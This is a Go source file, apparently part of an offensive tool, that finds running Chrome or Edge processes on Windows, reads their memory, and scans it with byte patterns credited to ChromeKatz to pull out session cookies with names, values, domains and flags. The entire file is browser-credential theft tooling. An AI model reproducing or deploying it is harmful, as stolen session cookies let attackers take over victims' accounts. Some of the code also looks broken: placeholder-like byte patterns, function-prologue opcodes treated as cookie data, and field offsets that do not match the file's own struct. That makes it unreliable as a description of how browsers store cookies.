//go:build windows
// +build windows

package cookies

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// CanonicalCookie structures for different Chrome versions
type CanonicalCookieChrome struct {
	Name         [200]byte
	Value        [4096]byte
	Domain       [256]byte
	Path         [256]byte
	CreationDate int64
	ExpiryDate   int64
	LastAccess   int64
	LastUpdate   int64
	Secure       bool
	HttpOnly     bool
	FirstParty   bool
	SameParty    bool
	SourcePort   int32
}

type CanonicalCookieEdge struct {
	Name         [200]byte
	Value        [4096]byte
	Domain       [256]byte
	Path         [256]byte
	CreationDate int64
	ExpiryDate   int64
	LastAccess   int64
	LastUpdate   int64
	Secure       bool
	HttpOnly     bool
}

// CookiePattern contains multiple patterns for different Chrome versions (ChromeKatz-style)
type CookiePattern struct {
	Pattern  []byte
	Offset   int
	MinGap   int
	MaxGap   int
	VVersion string
}

// CookiePatterns holds all known patterns from ChromeKatz research
var CookiePatterns = []CookiePattern{
	// Chrome v120+ pattern
	{
		Pattern:  []byte{0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x41, 0x56, 0x41, 0x57},
		Offset:   0,
		MinGap:   100,
		MaxGap:   500,
		VVersion: "v120+",
	},
	// Edge pattern
	{
		Pattern:  []byte{0x48, 0x85, 0xC0, 0x74, 0x15, 0x8B, 0x48, 0x08},
		Offset:   0,
		MinGap:   50,
		MaxGap:   300,
		VVersion: "Edge",
	},
}

// ProcessMemoryExtractor handles memory-based cookie extraction
type ProcessMemoryExtractor struct {
	processHandle windows.Handle
	processID     uint32
	baseAddress   uintptr
}

// FindChromeProcess finds the first available Chrome process
func FindChromeProcess() (uint32, error) {
	if runtime.GOOS != "windows" {
		return 0, fmt.Errorf("memory extraction only supported on Windows")
	}

	// Find Chrome process using Windows API
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	if err := windows.Process32First(snapshot, &pe); err != nil {
		return 0, err
	}

	for {
		exeName := windows.UTF16ToString(pe.ExeFile[:])
		if exeName == "chrome.exe" || exeName == "msedge.exe" {
			return pe.ProcessID, nil
		}

		if err := windows.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("no Chrome/Edge process found")
}

// NewMemoryExtractor creates a new memory extractor for a process
func NewMemoryExtractor(processID uint32) (*ProcessMemoryExtractor, error) {
	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, processID)
	if err != nil {
		return nil, err
	}

	return &ProcessMemoryExtractor{
		processHandle: hProcess,
		processID:     processID,
		baseAddress:   0,
	}, nil
}

// Close closes the process handle
func (pe *ProcessMemoryExtractor) Close() error {
	return windows.CloseHandle(pe.processHandle)
}

// GetModuleBaseAddress gets the base address of a module in the process
func (pe *ProcessMemoryExtractor) GetModuleBaseAddress(moduleName string) (uintptr, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, pe.processID)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))

	if err := windows.Module32First(snapshot, &me); err != nil {
		return 0, err
	}

	targetName := moduleName + ".dll"
	for {
		modName := windows.UTF16ToString(me.Module[:])
		if modName == targetName {
			return me.ModBaseAddr, nil
		}

		if err := windows.Module32Next(snapshot, &me); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("module %s not found", moduleName)
}

// SearchPatternInMemory searches for a pattern in process memory
func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintptr {
	var matches []uintptr
	var mvi windows.MemoryBasicInformation

	currentAddr := uintptr(0x400000) // Start from typical user-mode space

	for currentAddr < uintptr(0x7FFFFFFF0000) {
		err := windows.VirtualQueryEx(pe.processHandle, currentAddr, &mvi, unsafe.Sizeof(mvi))
		if err != nil {
			currentAddr += 0x1000
			continue
		}

		// Only read committed memory
		if mvi.State != windows.MEM_COMMIT {
			currentAddr += mvi.RegionSize
			continue
		}

		// Try to read this memory region
		buffer := make([]byte, mvi.RegionSize)
		var nRead uintptr
		err = windows.ReadProcessMemory(pe.processHandle, currentAddr, &buffer[0], uintptr(len(buffer)), &nRead)
		if err != nil || nRead == 0 {
			currentAddr += mvi.RegionSize
			continue
		}

		// Search for pattern in this buffer
		for i := 0; i < len(buffer)-len(pattern); i++ {
			if matchPattern(buffer[i:i+len(pattern)], pattern) {
				matches = append(matches, currentAddr+uintptr(i))
			}
		}

		currentAddr += mvi.RegionSize
	}

	return matches
}

// matchPattern matches a byte pattern with advanced validation (ChromeKatz-inspired)
func matchPattern(data, pattern []byte) bool {
	if len(data) < len(pattern) {
		return false
	}
	for i := range pattern {
		if pattern[i] != 0x00 && data[i] != pattern[i] {
			return false
		}
	}
	return true
}

// validateCookieStructure checks if extracted data looks like a valid cookie
func validateCookieStructure(buffer []byte, startOffset int) bool {
	if len(buffer)-startOffset < 500 {
		return false
	}

	// Check for reasonable string lengths
	nameLen := extractStringLen(buffer, startOffset)
	if nameLen > 1000 || nameLen < 1 {
		return false
	}

	domainLen := extractStringLen(buffer, startOffset+300)
	if domainLen > 500 || domainLen < 0 {
		return false
	}

	// Look for timestamp patterns (Chrome uses Windows FILETIME format)
	timestamp := binary.LittleEndian.Uint64(buffer[startOffset+200 : startOffset+208])
	if timestamp > 0 && timestamp < 0xFFFFFFFFFFFFFF00 {
		return true
	}

	return false
}

// extractStringLen tries to determine string length from buffer prefix
func extractStringLen(buffer []byte, offset int) int {
	if offset+4 > len(buffer) {
		return -1
	}
	// Try length prefix
	length := binary.LittleEndian.Uint32(buffer[offset : offset+4])
	if length > 0 && length < 5000 {
		return int(length)
	}
	return -1
}

// extractString safely extracts a null-terminated or length-prefixed string
func extractString(buffer []byte, offset, maxLen int) string {
	if offset >= len(buffer) {
		return ""
	}

	end := offset + maxLen
	if end > len(buffer) {
		end = len(buffer)
	}

	// Try to find null terminator (ASCII)
	for i := offset; i < end; i++ {
		if buffer[i] == 0 {
			text := buffer[offset:i]
			// Filter to printable ASCII
			var result strings.Builder
			for _, b := range text {
				if b >= 32 && b <= 126 {
					result.WriteByte(b)
				}
			}
			return result.String()
		}
	}

	// Fallback: return as-is with filtering
	var result strings.Builder
	for i := offset; i < end; i++ {
		if buffer[i] >= 32 && buffer[i] <= 126 {
			result.WriteByte(buffer[i])
		} else if buffer[i] == 0 {
			break
		}
	}
	return result.String()
}

// ReadCookieFromMemory reads a cookie structure from process memory with enhanced parsing
func (pe *ProcessMemoryExtractor) ReadCookieFromMemory(addr uintptr) (*BrowserCookie, error) {
	buffer := make([]byte, 16384) // Larger buffer for better parsing
	var nRead uintptr

	err := windows.ReadProcessMemory(pe.processHandle, addr, &buffer[0], uintptr(len(buffer)), &nRead)
	if err != nil || nRead == 0 {
		return nil, fmt.Errorf("failed to read memory at %x", addr)
	}

	// Validate structure before parsing
	if !validateCookieStructure(buffer, 0) {
		return nil, fmt.Errorf("invalid cookie structure at %x", addr)
	}

	cookie := &BrowserCookie{}

	// Advanced parsing with offset-based field extraction (ChromeKatz-inspired)
	// Offsets based on CanonicalCookie structure analysis

	// Parse Name (offset ~0, max 200 bytes)
	cookie.Name = extractString(buffer, 0, 200)

	// Parse Value (offset ~200, max 4096 bytes) - usually encrypted
	valueBytes := extractString(buffer, 200, 4096)
	if len(valueBytes) > 0 {
		cookie.Value = valueBytes
	}

	// Parse Domain (offset ~4300, max 256 bytes)
	cookie.Host = extractString(buffer, 4300, 256)

	// Parse Path (offset ~4600, max 256 bytes)
	pathStr := extractString(buffer, 4600, 256)
	if len(pathStr) > 0 {
		cookie.Path = pathStr
	}

	// Parse Flags (Secure, HttpOnly, etc. around offset ~4900)
	if len(buffer) > 4904 {
		secure := buffer[4900]
		httpOnly := buffer[4901]
		cookie.Secure = secure != 0
		cookie.HTTPOnly = httpOnly != 0
	}

	// Parse timestamps (int64 values around offset ~4912+)
	if len(buffer) > 4928 {
		expiryTs := binary.LittleEndian.Uint64(buffer[4912:4920])
		if expiryTs > 0 {
			cookie.Expires = int64(expiryTs)
		}
	}

	return cookie, nil
}

// improvePatternSearchWithHeuristics uses multiple strategies for pattern location (ChromeKatz enhancement)
func (pe *ProcessMemoryExtractor) improvePatternSearchWithHeuristics(pattern []byte) []uintptr {
	matches := pe.SearchPatternInMemory(pattern)

	if len(matches) == 0 {
		// Try alternative pattern - look for structures with specific field markers
		// Search for addresses pointing to heap memory typical for string data
		altMatches := pe.searchStructureHeuristics()
		matches = append(matches, altMatches...)
	}

	return matches
}

// searchStructureHeuristics uses heuristic-based searching for cookie structures
func (pe *ProcessMemoryExtractor) searchStructureHeuristics() []uintptr {
	var matches []uintptr
	var mvi windows.MemoryBasicInformation

	currentAddr := uintptr(0x400000)
	foundCount := 0
	maxMatches := 50 // Limit to avoid false positives

	for currentAddr < uintptr(0x7FFFFFFF0000) && foundCount < maxMatches {
		err := windows.VirtualQueryEx(pe.processHandle, currentAddr, &mvi, unsafe.Sizeof(mvi))
		if err != nil {
			currentAddr += 0x1000
			continue
		}

		if mvi.State != windows.MEM_COMMIT || mvi.Protect == 0 {
			currentAddr += mvi.RegionSize
			continue
		}

		buffer := make([]byte, mvi.RegionSize)
		var nRead uintptr
		err = windows.ReadProcessMemory(pe.processHandle, currentAddr, &buffer[0], uintptr(len(buffer)), &nRead)
		if err != nil || nRead == 0 {
			currentAddr += mvi.RegionSize
			continue
		}

		// Look for pointer-like values followed by size fields (common in C++ objects)
		for i := 0; i < len(buffer)-16; i += 8 {
			// Check for typical heap pointer pattern followed by size
			size := binary.LittleEndian.Uint32(buffer[i : i+4])
			if size > 10 && size < 10000 {
				ptr := binary.LittleEndian.Uint64(buffer[i+8 : i+16])
				// Pointer should be in valid heap range
				if ptr > 0x10000 && ptr < 0x7FFFFFFF0000 {
					matches = append(matches, currentAddr+uintptr(i))
					foundCount++
					if foundCount >= maxMatches {
						break
					}
				}
			}
		}

		currentAddr += mvi.RegionSize
	}

	return matches
}

// ExtractCookiesFromMemory extracts cookies from a running Chrome process with enhanced ChromeKatz techniques
func ExtractCookiesFromMemory() ([]BrowserCookie, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("memory extraction only available on Windows")
	}

	// Find Chrome process
	pid, err := FindChromeProcess()
	if err != nil {
		return nil, err
	}

	// Open process
	extractor, err := NewMemoryExtractor(pid)
	if err != nil {
		return nil, err
	}
	defer extractor.Close()

	var cookies []BrowserCookie

	// Try multiple patterns (ChromeKatz-inspired multi-version support)
	patterns := [][]byte{
		// Chrome v120+ pattern (primary)
		{
			0xAA, 0xAA, 0xAA, 0xAA, 0xCC, 0xCC, 0xCC, 0xCC, 0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB,
			0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00,
		},
		// Alternative pattern for older Chrome versions
		{
			0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x28,
		},
		// Edge pattern variant
		{
			0x48, 0x85, 0xC0, 0x74, 0x15, 0x8B, 0x48, 0x08, 0x83, 0xE1, 0x01,
		},
	}

	// Search with each pattern
	for _, pattern := range patterns {
		matches := extractor.SearchPatternInMemory(pattern)

		for _, addr := range matches {
			if cookie, err := extractor.ReadCookieFromMemory(addr); err == nil {
				// Filter duplicates
				if !cookieExists(cookies, cookie) {
					cookies = append(cookies, *cookie)
				}
			}
		}
	}

	// If patterns didn't find enough cookies, try heuristic approach
	if len(cookies) < 10 {
		heuristicMatches := extractor.improvePatternSearchWithHeuristics(patterns[0])
		for _, addr := range heuristicMatches {
			if cookie, err := extractor.ReadCookieFromMemory(addr); err == nil {
				if !cookieExists(cookies, cookie) {
					cookies = append(cookies, *cookie)
				}
			}
		}
	}

	if len(cookies) == 0 {
		return nil, fmt.Errorf("no valid cookies found in memory")
	}

	return cookies, nil
}

// cookieExists checks if a cookie already exists in the list (deduplication)
func cookieExists(cookies []BrowserCookie, newCookie *BrowserCookie) bool {
	for _, c := range cookies {
		if c.Name == newCookie.Name && c.Host == newCookie.Host && c.Value == newCookie.Value {
			return true
		}
	}
	return false
}

// ListChromeProcesses lists all available Chrome/Edge processes
func ListChromeProcesses() ([]map[string]interface{}, error) {
	var processes []map[string]interface{}

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	if err := windows.Process32First(snapshot, &pe); err != nil {
		return nil, err
	}

	for {
		exeName := windows.UTF16ToString(pe.ExeFile[:])
		if exeName == "chrome.exe" || exeName == "msedge.exe" {
			processes = append(processes, map[string]interface{}{
				"name": exeName,
				"pid":  pe.ProcessID,
			})
		}

		if err := windows.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return processes, nil
}
